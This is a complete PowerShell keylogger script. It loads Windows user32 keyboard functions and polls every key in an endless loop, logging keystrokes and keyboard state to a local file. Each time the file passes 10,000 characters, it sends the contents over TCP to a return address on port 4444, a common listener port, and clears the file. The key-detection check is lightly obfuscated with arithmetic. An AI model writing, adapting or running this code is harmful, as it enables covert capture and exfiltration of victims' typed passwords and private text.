
Function Send-TCPMessage { 
    Param ( 
            [Parameter(Mandatory=$true, Position=0)]
            [ValidateNotNullOrEmpty()] 
            [string] 
			#$EndPoint
			$IP
        , 
            [Parameter(Mandatory=$true, Position=1)]
            [int]
            $Port
        , 
            [Parameter(Mandatory=$true, Position=2)]
            [string]
            $Message
    ) 
    Process {
        # Setup connection 
        #$IP = [System.Net.Dns]::GetHostAddresses($EndPoint) 
        $Address = [System.Net.IPAddress]::Parse($IP) 
        $Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
    
        # Setup stream wrtier 
        $Stream = $Socket.GetStream() 
        $Writer = New-Object System.IO.StreamWriter($Stream)

        # Write message to stream
        $Message | % {
            $Writer.WriteLine($_)
            $Writer.Flush()
        }
    
        # Close connection and stream
        $Stream.Close()
        $Socket.Close()
    }
}
$Sig1 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
$Sig2 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$Sig3 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
$Sig4 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
Function Main-Run {
	Process {
		
		Add-Type -MemberDefinition $Sig1 -Name Keyboard -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig2 -Name MapVkey -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi

		$file = ".\out.txt"
		$ret_addr = "127.0.0.1"
		$ret_port = 4444

		while($true){
			Start-Sleep -Milliseconds 50
			for ($key_num=8; $key_num -le 254; $key_num++){
				$key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
				$thing = -(15999 + 16768)
				$val = ($key_pressed -eq $thing)
				if ($val) {
					$vk = [PsOneApi.MapVkey]::MapVirtualKey($key_num,3)
					$kb = New-Object Byte[] 256
					$kbs = [PsOneApi.GetKBS]::GetKeyboardState($kb)
					$combined_string = [string]$key_num + "|" + [string]$vk + "|" + [string]::Join("",$kb)
					Add-Content -Path $file -Value $combined_string
					$content = [System.IO.File]::ReadAllText($file)
					$length = $content.Length
					if ($length -gt 10000){
						Send-TCPMessage -IP $ret_addr -Port $ret_port -Message $content
						Set-Content -Path $file -Value ""
					}
				}
			}
		}
	}
}
Main-Run